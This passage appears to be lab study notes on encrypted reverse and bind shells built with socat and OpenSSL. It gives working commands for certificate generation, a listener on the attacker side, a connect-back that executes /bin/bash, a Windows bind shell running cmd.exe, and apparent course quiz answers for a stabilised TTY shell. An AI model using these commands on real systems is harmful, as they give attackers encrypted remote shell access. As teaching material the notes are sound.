
Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells.


# Useful Commands:


We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.  

We then need to merge the two created files into a single `.pem` file:

```bash
cat shell.key shell.crt > shell.pem
```

### Encrypted Reverse Shell

When we set up our reverse shell listener, we use:

```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate _must_ be used on whichever device is listening.  

To connect back, we would use:

```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

### Encrypted Bind Shell

Target:

```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
``` 

Attacker:

```bash
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

### Critical Thinking: Stable Encrypted Shell

==We merged the encryption to stabilisation ==

What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

```bash
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```

If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

```bash
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

